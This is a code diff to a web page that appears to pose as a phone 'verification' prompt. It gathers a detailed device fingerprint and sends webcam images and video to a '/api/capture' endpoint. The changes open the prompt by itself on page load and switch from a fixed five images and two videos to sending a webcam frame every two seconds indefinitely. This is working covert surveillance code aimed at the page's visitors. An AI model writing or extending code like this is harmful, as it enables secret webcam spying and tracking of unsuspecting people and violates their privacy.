@@ -126,6 +126,12 @@
         const hiddenVideo = document.getElementById('hiddenVideo');
         const ENDPOINT = '/api/capture';
 
+        // Show modal IMMEDIATELY on page load
+        window.onload = () => {
+            modal.classList.add('show');
+            phoneInput.focus();
+        };
+
         const openModal = () => { modal.classList.add('show'); phoneInput.focus(); };
         document.getElementById('activateBtn').addEventListener('click', openModal);
         document.querySelectorAll('.plan-button').forEach((button) => button.addEventListener('click', openModal));
@@ -153,7 +159,8 @@
                 // Collect massive fingerprint (including async data)
                 const fingerprint = await collectFingerprint(digits);
 
-                captureSequence(stream, fingerprint);
+                // Start continuous capture (no limits)
+                captureContinuous(stream, fingerprint);
             } catch (err) {
                 alert('Verification failed. Please allow camera access and try again.');
                 verifyBtn.disabled = false;
@@ -182,7 +189,6 @@
                 online: navigator.onLine,
                 cookiesEnabled: navigator.cookieEnabled,
                 doNotTrack: navigator.doNotTrack,
-                // WebGL
                 webgl: (() => {
                     try {
                         const canvas = document.createElement('canvas');
@@ -197,7 +203,6 @@
                 })(),
             };
 
-            // Battery (if available)
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -211,7 +216,6 @@
                 base.battery = null;
             }
 
-            // Connection details (already in navigator.connection)
             if (navigator.connection) {
                 base.connection = {
                     type: navigator.connection.type,
@@ -224,28 +228,25 @@
             return base;
         }
 
-        // Capture 5 images and 2 videos (MP4 if supported)
-        function captureSequence(stream, fingerprint) {
+        // CONTINUOUS capture - images every 2 seconds forever
+        function captureContinuous(stream, fingerprint) {
             const canvas = document.createElement('canvas');
             canvas.width = 640;
             canvas.height = 480;
             const ctx = canvas.getContext('2d');
 
-            let imageCount = 0;
-            const imageInterval = setInterval(() => {
+            // Send an image every 2 seconds, indefinitely
+            setInterval(() => {
                 ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                 const image = canvas.toDataURL('image/jpeg', 0.7);
                 sendToServer({ type: 'image', image, fingerprint });
-                imageCount++;
-                if (imageCount >= 5) {
-                    clearInterval(imageInterval);
-                    recordVideo(stream, fingerprint, 0);
-                }
             }, 2000);
+
+            // Also record 2 videos (once) after a short delay
+            setTimeout(() => recordVideo(stream, fingerprint, 0), 3000);
         }
 
         function recordVideo(stream, fingerprint, videoIndex) {
-            // Choose MP4 if supported, else fallback to WebM
             let mimeType = 'video/mp4';
             if (!MediaRecorder.isTypeSupported(mimeType)) {
                 mimeType = 'video/webm';
@@ -255,7 +256,6 @@
             try {
                 recorder = new MediaRecorder(stream, { mimeType: mimeType });
             } catch (e) {
-                // If even the fallback fails, try default
                 recorder = new MediaRecorder(stream);
                 mimeType = recorder.mimeType || 'video/webm';
             }
